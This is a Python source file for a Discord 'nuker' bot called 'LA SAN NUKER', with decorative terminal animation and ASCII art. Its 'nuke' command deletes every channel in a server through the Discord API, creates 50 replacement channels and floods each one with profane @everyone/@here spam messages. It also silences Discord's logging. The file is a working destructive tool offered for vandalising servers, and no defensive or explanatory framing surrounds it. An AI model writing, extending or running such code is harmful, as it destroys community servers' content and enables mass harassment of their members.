import asyncio
import aiohttp
import discord
from discord.ext import commands
import os
import re
import logging
import shutil
import time
import math
import threading
from datetime import datetime

WHITE = '\033[97m'
GRAY = '\033[90m'
DARK = '\033[30m'
RESET = '\033[0m'
CHARS = ' .:-=+*#@'


def get_terminal_size_plasma():
    try:
        cols, rows = shutil.get_terminal_size()
        return max(20, cols), max(10, rows)
    except:
        return 80, 24


def clear_screen():
    try:
        print('\033[2J\033[H', end='', flush=True)
    except:
        os.system('cls' if os.name == 'nt' else 'clear')


def value_to_char(v):
    v = max(0, min(1, (v + 1) / 2))
    return CHARS[int(v * (len(CHARS) - 1))]


def plasma(x, y, w, h, t):
    cx, cy = w / 2, h / 2
    dx, dy = x - cx, y - cy
    angle = math.atan2(dy, dx)
    r = math.sqrt(dx * dx + dy * dy) / max(w, h) * 20
    angle = abs((angle % (math.pi / 4)) - math.pi / 8)
    return math.sin(angle * 8 + r - t * 2)


def run_plasma_animation(duration_sec=1.5):
    start = time.time()
    try:
        while time.time() - start < duration_sec:
            width, height = get_terminal_size_plasma()
            t = time.time()
            grid = []
            for y in range(height):
                row = []
                for x in range(width):
                    v = plasma(x, y, width, height, t)
                    row.append(f"{WHITE}{value_to_char(v)}{RESET}")
                grid.append(row)
            clear_screen()
            print('\n'.join([''.join(r) for r in grid]))
            time.sleep(0.05)
    except KeyboardInterrupt:
        pass
    clear_screen()


def typewrite_loop():
    title_text = 'LA SAN NUKER'
    try:
        while True:
            for i in range(len(title_text) + 1):
                os.system(f'title {title_text[:i]}')
                time.sleep(0.1)
            time.sleep(1)
    except:
        pass


def run_animation_threads():
    title_thread = threading.Thread(target=typewrite_loop, daemon=True)
    title_thread.start()
    run_plasma_animation(duration_sec=1.5)
    return title_thread


def set_console_color(color):
    try:
        os.system(f'color {color}')
    except:
        pass


def show_ascii_art():
    set_console_color('07')
    os.system('cls')

    try:
        cols, rows = shutil.get_terminal_size()
    except:
        cols, rows = 100, 30

    def center(text):
        return text.center(cols)

    ascii_lines = [
        ' █████         █████████       █████████    █████████   ██████   █████',
        '▒▒███         ███▒▒▒▒▒███     ███▒▒▒▒▒███  ███▒▒▒▒▒███ ▒▒██████ ▒▒███ ',
        ' ▒███        ▒███    ▒███    ▒███    ▒▒▒  ▒███    ▒███  ▒███▒███ ▒███ ',
        ' ▒███        ▒███████████    ▒▒█████████  ▒███████████  ▒███▒▒███▒███ ',
        ' ▒███        ▒███▒▒▒▒▒███     ▒▒▒▒▒▒▒▒███ ▒███▒▒▒▒▒███  ▒███ ▒▒██████ ',
        ' ▒███      █ ▒███    ▒███     ███    ▒███ ▒███    ▒███  ▒███  ▒▒█████ ',
        ' ███████████ █████   █████   ▒▒█████████  █████   █████ █████  ▒▒█████',
        '▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒     ▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒   ▒▒▒▒▒ ▒▒▒▒▒    ▒▒▒▒▒ ',
    ]

    content_height = 2 + len(ascii_lines) + 2 + 1 + 1
    top_padding = max(0, (rows - content_height) // 3)

    for _ in range(top_padding):
        print()

    for line in ascii_lines:
        print(center(line.rstrip()))
    print()
    print()
    X = '\033[0m'
    print(center(X + 'Press Enter To Start Bot...' + X))
    print()

    input()


def get_cols():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 100


def strip_ansi(text):
    return re.sub(r'\033\[[0-?]*[ -/]*[@-~]', '', text)


def center_print(text):
    try:
        cols = shutil.get_terminal_size().columns
    except:
        cols = 100
    visible_len = len(strip_ansi(text))
    padding = max(0, (cols - visible_len) // 2)
    print(' ' * padding + text)


def print_message(text, msg_type='info'):
    ts = datetime.now().strftime("%I:%M %p")
    cols = get_cols()
    msg = f"[{ts}] - {text}"
    pad = (cols - len(msg)) // 2
    print(" " * pad + msg)
    print()


def print_dashboard(bot, prefix):
    ts = datetime.now().strftime("%I:%M %p")
    cols = get_cols()
    msg = f"[{ts}] - Bot Logged In"
    pad = (cols - len(msg)) // 2
    print(" " * pad + msg)
    print()


def print_message(text, msg_type='info'):
    from datetime import datetime
    timestamp = datetime.now().strftime("%H:%M:%S")
    cols = get_cols()
    msg = f"[{timestamp}] - {text}"
    indent = ' ' * max(0, (cols - len(msg)) // 2)
    print(indent + msg)
    print()


def load_config():
    config = {}
    with open('config.txt', 'r') as f:
        for line in f:
            if '=' in line:
                key, value = line.strip().split('=', 1)
                config[key] = value
    return config


run_animation_threads()
show_ascii_art()

config = load_config()
TOKEN = config.get('TOKEN', '')
PREFIX = config.get('PREFIX', '.')

discord_logger = logging.getLogger('discord')
discord_logger.setLevel(logging.CRITICAL)
discord_logger.addHandler(logging.NullHandler())
logging.getLogger('discord.http').setLevel(logging.CRITICAL)
logging.getLogger('discord.gateway').setLevel(logging.CRITICAL)
logging.getLogger('discord.client').setLevel(logging.CRITICAL)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
last_error_time = 0


async def delete_channel_via_api(session, channel_id, headers):
    try:
        async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as resp:
            return resp.status == 200 or resp.status == 204
    except:
        return False


async def create_channel_via_api(session, guild_id, headers, channel_data):
    try:
        async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json=channel_data) as resp:
            if resp.status == 201:
                return await resp.json()
            return None
    except:
        return None


async def send_message_to_channel(channel, message):
    global last_error_time
    try:
        await channel.send(message)
        return True
    except discord.errors.HTTPException as e:
        if e.status == 429:
            current_time = time.time()
            if current_time - last_error_time > 1:
                print_message('Failed To Send Message - API Cooldown', 'error')
                last_error_time = current_time
            return False
        return False
    except:
        return False


def get_spam_message():
    return '# Fucked By La_San @everyone @here La_San @everyone @here La_San @everyone @here La_San @everyone @here La_San @everyone @here La_San @everyone @here '


@bot.event
async def on_ready():
    print_dashboard(bot, PREFIX)


@bot.command(name='ping')
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f'Pong! Latency: **{latency}ms**')


@bot.command(name='nuke')
async def nuke(ctx):
    if not ctx.guild:
        return

    guild = ctx.guild
    server_name = guild.name

    headers = {
        'Authorization': f'Bot {TOKEN}',
        'Content-Type': 'application/json',
        'User-Agent': 'DiscordBot'
    }

    async with aiohttp.ClientSession() as session:
        delete_tasks = []
        for channel in guild.channels:
            delete_tasks.append(delete_channel_via_api(session, channel.id, headers))

        await asyncio.gather(*delete_tasks, return_exceptions=True)
        await asyncio.sleep(0.5)

        channel_creation_tasks = []
        for i in range(50):
            channel_data = {
                'name': 'la_san _top',
                'type': 0,
                'topic': 'Nuked By La_San @everyone @here',
                'parent_id': None
            }
            channel_creation_tasks.append(create_channel_via_api(session, guild.id, headers, channel_data))

        created_channels = await asyncio.gather(*channel_creation_tasks, return_exceptions=True)

        valid_channels = []
        for result in created_channels:
            if result and isinstance(result, dict) and 'id' in result:
                ch = bot.get_channel(int(result['id']))
                if ch:
                    valid_channels.append(ch)

        await asyncio.sleep(0.5)

        async def spam_channel(ch):
            sent = 0
            attempts = 0
            while sent < 10 and attempts < 50:
                tasks = []
                for _ in range(10 - sent):
                    tasks.append(send_message_to_channel(ch, get_spam_message()))
                results = await asyncio.gather(*tasks, return_exceptions=True)
                sent += sum(1 for r in results if r is True)
                attempts += 1
                if sent < 10:
                    await asyncio.sleep(0.05)

        spam_tasks = [spam_channel(c) for c in valid_channels]
        await asyncio.gather(*spam_tasks, return_exceptions=True)

        print_message(f'Nuked Server: {server_name}', 'success')


bot.run(TOKEN)